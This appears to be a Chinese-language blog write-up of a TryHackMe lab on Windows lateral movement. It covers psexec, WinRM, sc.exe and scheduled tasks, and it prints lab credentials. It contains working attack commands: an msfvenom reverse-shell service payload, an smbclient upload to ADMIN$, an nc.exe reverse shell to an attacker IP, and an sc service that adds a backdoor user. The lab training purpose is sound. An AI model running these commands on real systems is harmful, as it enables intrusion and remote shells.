---
title: "横向移动-远程创建进程"
date: "2024-09-08"
description: "多年来，Psexec 一直是需要远程执行进程时的首选方法。它允许管理员用户在他有权访问的任何 PC 上远程运行命令。 Psexec 是众多 Sysinternals 工具之一，可以在此处下载。"
---

## [](#Psexec-执行程序 "Psexec 执行程序")Psexec 执行程序

*   **Ports:** 445/TCP (SMB)  
    **端口：** 445/ TCP （ SMB ）
*   **Required Group Memberships:** Administrators  
    \*\*所需的组成员身份：管理员

多年来，Psexec 一直是需要远程执行进程时的首选方法。它允许管理员用户在他有权访问的任何 PC 上远程运行命令。 Psexec 是众多 Sysinternals 工具之一，可以[在此处](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)下载。

##### [](#psexec-的工作方式如下： "psexec 的工作方式如下：")psexec 的工作方式如下：

1.  Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.  
    连接到 Admin$ 共享并上传服务二进制文件。 Psexec 使用 psexesvc.exe 作为名称。
2.  Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with `C:\Windows\psexesvc.exe`.  
    连接到服务控制管理器以创建并运行名为 PSEXESVC 的服务，并将服务二进制文件与`C:\Windows\psexesvc.exe`关联。
3.  Create some named pipes to handle stdin/stdout/stderr.  
    创建一些命名管道来处理 stdin/stdout/stderr。

其实工作方式很明确了,就是通过一些通道或者一些东西来传输对应的命令。但是我们需要对面的管理员权限因此我们刚才的总基调就可以看到，我们只能使用域管理员和一些默认管理员  
进行一些管道的传输。

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a488102fe0da47a3667961400cf298d8.png)

要运行 psexec，我们只需提供远程主机所需的管理员凭据以及我们要运行的命令（为方便起见， `psexec64.exe`可在 THMJMP2 的`C:\tools`下找到）：  
只能对应的是管理员

```shell
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

### [](#使用-WinRM-远程创建进程 "使用 WinRM 远程创建进程")使用 WinRM 远程创建进程

*   **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)  
    **端口：** 5985/TCP (WinRM HTTP ) 或 5986/ TCP (WinRM HTTPS)
*   **Required Group Memberships:** Remote Management Users  
    \*\*所需的组成员身份：\*\*远程管理用户

远程管理员”这个术语强调的是管理操作的方式，而不仅仅是权限。即便某个用户是本地管理员，称为“远程管理员”是为了区分他们是通过远程工具（如远程桌面或 PsExec）来执行管理任务的。这种表述帮助明确管理员的管理操作是通过远程手段完成的，而不是在本地直接操作

Windows 远程管理 (WinRM) 是一种基于 Web 的协议，用于远程向 Windows 主机发送 Powershell 命令。大多数 Windows Server 安装都会默认启用 WinRM，这使其成为一个有吸引力的攻击媒介。

要从命令行连接到远程 Powershell 会话，我们可以使用以下命令：

```shell
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

我们可以从 Powershell 实现相同的目的，但要传递不同的凭据，我们需要创建一个 PSCredential 对象：

```powershell
$username = 'Administrator';$password = 'Mypass123';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

获得 PSCredential 对象后，我们可以使用 Enter-PSSession cmdlet 创建交互式会话：

```powershell
Enter-PSSession -Computername TARGET -Credential $credential
```

Powershell 还包括 Invoke-Command cmdlet，它通过 WinRM 远程运行 ScriptBlocks。凭证也必须通过 PSCredential 对象传递：

```powershell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

### [](#使用-sc远程创建服务 "使用 sc远程创建服务")使用 sc远程创建服务

*   **Ports: 端口：**
    *   135/TCP, 49152-65535/TCP (DCE/RPC)  
        135/ TCP ，49152-65535/ TCP （DCE/RPC）
    *   445/TCP (RPC over SMB Named Pipes)  
        445/ TCP （基于SMB命名管道的 RPC）
    *   139/TCP (RPC over SMB Named Pipes)  
        139/ TCP （基于SMB命名管道的 RPC）
*   **Required Group Memberships:** Administrators  
    \*\*所需的组成员身份：\*\*管理员

Windows 服务也可用于运行任意命令，因为它们在启动时执行命令。虽然服务可执行文件在技术上与常规应用程序不同，但如果我们配置 Windows 服务来运行任何应用程序，它仍然会执行该应用程序并随后失败。启动服务居然可以任意执行相关命令 ，因此可以看到对应也可以执行对应的命令。

##### [](#PS一下相关的服务相关内容 "PS一下相关的服务相关内容")PS一下相关的服务相关内容

###### [](#创建-Windows-服务时的注意事项： "创建 Windows 服务时的注意事项：")创建 Windows 服务时的注意事项：

1.  **权限**：
    
    *   Windows 服务通常在系统级别运行，因此需要相应的权限。确保你有足够的权限来创建和管理服务。
    *   服务的账户可以是系统账户（如 LocalSystem、NetworkService）或特定用户账户。使用系统账户时，服务具有更高的权限，但也需要谨慎，以避免潜在的安全风险。
2.  **服务主程序**：
    
    *   服务的主程序通常是一个可执行文件（`.exe`）。这个可执行文件必须符合 Windows 服务的要求，即能够响应启动、停止、暂停等控制命令。
    *   常用的服务主程序框架包括 `.NET` 提供的 `ServiceBase` 类和 Windows API 提供的服务控制函数。
3.  **执行命令**：
    
    *   在服务启动时，你可以通过服务的主程序执行命令。通常，这些命令包括启动必要的进程、初始化资源等。
    *   在服务中执行命令时，需要处理好可能的错误和异常，以确保服务的稳定性。例如，启动时可能需要加载配置文件、建立网络连接等。
4.  **配置和管理**：
    
    *   服务的配置通常存储在注册表中，或者通过配置文件来管理。你可以使用 `sc` 命令、`PowerShell` 脚本或服务控制面板来安装、启动、停止和删除服务。
    *   在服务中执行命令时，确保命令的路径、环境变量等配置正确，以避免服务启动失败。
5.  **日志和监控**：
    
    *   服务通常需要有适当的日志记录机制，以便监控其运行状态和排查故障。确保服务能够记录必要的日志信息，例如启动成功、错误信息等。

我们可以使用 sc.exe（Windows 中提供的标准工具）在远程主机上创建服务。使用sc时，它会通过几种方式尝试通过RPC连接到服务控制管理器（SVCCTL）远程服务程序：

1.  将使用 DCE/RPC 进行连接尝试。客户端将首先在端口 135 连接到端点映射器 (EPM)，该端点映射器充当可用 RPC 端点的目录并请求有关 SVCCTL 服务程序的信息。然后，EPM 将响应 IP 和端口以连接到 SVCCTL，该端口通常是 49152-65535 范围内的动态端口。 其实这是rpc 协议的连接过程，先通过对应的EPM 端点映射

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c4f288e73da9c0f4d480ad817b365fe5.png)

1.  如果后一个连接失败，sc 将尝试通过端口 445 ( SMB ) 或 139 ( SMB over NetBIOS ) 上的SMB命名管道到达 SVCCTL。

![svcctl via named pipe](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0c425c37d692c771c944e38dca8c5879.png)  
所以我感觉应该是两个协议 ，一个是对应的rpc一个是smb 但是对应的服务可以执行相关命令。  
我们可以使用以下命令创建并启动名为“THMservice”的服务：

```plaintext
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= autosc.exe \\TARGET start THMservice
```

服务启动时将执行“net user”命令，在系统上创建一个新的本地用户。由于操作系统负责启动服务，因此您将无法查看命令输出。

要停止并删除该服务，我们可以执行以下命令：

```plaintext
sc.exe \\TARGET stop THMservicesc.exe \\TARGET delete THMservice
```

### [](#Creating-Scheduled-Tasks-Remotely "Creating Scheduled Tasks Remotely")Creating Scheduled Tasks Remotely

\*\*远程创建计划任务

我们可以使用的另一个 Windows 功能是计划任务。您可以使用 schtasks 远程创建并运行一个任务，该任务可在任何 Windows 安装中使用。要创建名为 THMtask1 的任务，我们可以使用以下命令：

```shell
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 schtasks /s TARGET /run /TN "THMtask1" 
```

我们将计划类型 (/sc) 设置为 ONCE，这意味着该任务仅在指定的时间和日期运行一次。由于我们将手动运行任务，因此开始日期 (/sd) 和开始时间 (/st) 无论如何都不重要。

由于系统将运行计划任务，因此我们将无法获得该命令的输出，这使得这是一种盲目攻击。

最后，要删除计划任务，我们可以使用以下命令并自行清理：

```powershell
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

### [](#实战实例 "实战实例")实战实例

针对特定的本地任务  
**User:** ZA.TRYHACKME.COM\\t1\_leonard.summers  
**用户：** ZA.TRYHACKME.COM\\t1\_leonard.summers

**Password:** EZpass4ever  
**密码：** EZpass4ever

虽然我们已经展示了如何使用 sc 在远程系统上创建用户（通过使用`net user` ），但我们还可以上传我们想要执行的任何二进制文件并将其与创建的服务关联。但是，如果我们尝试使用此方法运行反向 shell，我们会注意到反向 shell 在执行后立即断开连接。原因是服务可执行文件与标准 .exe 文件不同，因此非服务可执行文件几乎会立即被服务管理器杀死。对我们来说幸运的是，msfvenom 支持`exe-service`格式，它将我们喜欢的任何有效负载封装在功能齐全的服务可执行文件中，防止它被杀死。

在 Windows 中，`.exe` 文件是可执行文件的标准扩展名，用于运行程序。而 `exe-service` 可能指的是在服务环境中运行的可执行程序，通常是 Windows 服务（Service），它们在后台运行并可以在系统启动时自动启动。

**主要区别**：

*   **`.exe` 文件**：直接运行的程序，用户可以通过双击打开。
*   **Windows 服务**：在后台运行的程序，通常以 `Service` 模式启动和管理。它们可以用 `sc` 命令或服务管理工具（如服务控制面板）来安装和管理。

因此分析一下目前我们的优势，首先我们目前有对应横向主机的一个管理员用户，并且此时我们准备打算采用sc.exe的方式来创建对应的一个服务同时来执行相关命令，我们不来创建用户我们来直接用一个服务的可执行文件，我们可以使用直接用这个负载来反弹一个shell。

但是此时我们准备横向的是THMIIS 并且此时我们已经拿到对应的相关的THMIIS 上的一个管理员的凭据 那么此时我准备尝试不同的方式去横向到对应的 服务器上。

##### [](#ssh尝试 "ssh尝试")ssh尝试

首先根据我们的主旨，我们需要横向到对应的主机。第一步肯定是伪装我们目前是处于一个thmjmp2 的机器上我目前还不知道它属于什么组。可以查一下经过命令查询可以看到它属于domain 和 internet组 但是我目前想知道他属于哪一个ou  
由于我发现我目前的凭证并不是管理员用户，所以我无法使用cmdlet 和mmc 进行收集。此时使用猎狗sharphound

首先使用ssh

```shell
ssh t1_leonard.summers@thmiis.za.tryhackme.com 
```

成功

##### [](#psexec "psexec")psexec

```shell
psexec64.exe \\thmiis.za.tryhackme.com  -u t1_leonard.summers   -p EZpass4ever -i cmd.exe
```

这个不知道为啥一直失败

##### [](#winrm "winrm")winrm

```shell
winrs.exe -u:t1_leonard.summers -p:EZpass4ever -r:thmiis.za.tryhackme.com  cmd
```

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240907211732.png)

##### [](#sc-exe "sc.exe")sc.exe

windows服务相关的内容不再赘述，我们直接生成对应的exe-service

```shell
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.148.56 LPORT=4444 -o k1t0service.exe
```

然后，我们将继续使用 t1\_leonard.summers 凭据，使用 AttackBox 中的 smbclient 将有效负载上传到 THMIIS 的 ADMIN$ 共享：

```shell
smbclient -c 'put k1t0service.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240907213326.png)  
上传可执行文件后，我们将在攻击者的计算机上设置一个侦听器以接收来自`msfconsole`的反向 shell：

```shell
user@AttackBox$ msfconsolemsf6 > use exploit/multi/handlermsf6 exploit(multi/handler) > set LHOST lateralmovementmsf6 exploit(multi/handler) > set LPORT 4444msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcpmsf6 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 10.10.10.16:4444
```

由于`sc.exe`不允许我们在命令中指定凭据，因此我们需要使用`runas`来生成带有 t1\_leonard.summer 访问令牌的新 shell。尽管如此，我们只能通过SSH访问机器，所以如果我们尝试类似的操作 `runas /netonly /user:ZA\t1_leonard.summers cmd.exe` ，新的命令提示符将在用户的会话中生成，但我们无法访问它。为了解决这个问题，我们可以使用 runas 生成带有 t1\_leonard.summers 访问令牌的第二个反向 shell：  
其实这句话看似很难理解，其实仔细想一想真的很难理解吗？ HAHAH 其实只是因为啥呢?只是因为我们是用攻击盒进行渗透的。所以如果说我们runas 之后/netonly 我们在盒子上是看不到这个cmd 会话的

```shell
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.148.56 4443"
```

此时需要在盒子上开一个nc -nvlp 4443  
最后，继续使用 sc 远程创建一个新服务，并将其与我们上传的二进制文件关联起来：

```shell
C:\> sc.exe \\thmiis.za.tryhackme.com create THMservice-3244 binPath= "%windir%\k1t0service.exe" start= autoC:\> sc.exe \\thmiis.za.tryhackme.com start THMservice-3244
```

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240908100905.png)

成功使用sc 服务反弹回来一个shell ，并且是根据一个负载和一个服务捆绑。  
但是一定要注意，我们的服务名称和一个服务的路径一定要是独属于自己的。

### [](#总结 "总结")总结

看似我们在横向移动，其实我们这种方式是非常鸡肋的。我们无论是psexec，winrm ，定时任务，sc服务，ssh，rdp进行一个横向我们都是需要一个管理员用户的……..可以称为这个集合为我们拿到一定的凭据之后可以采用的一些姿势。
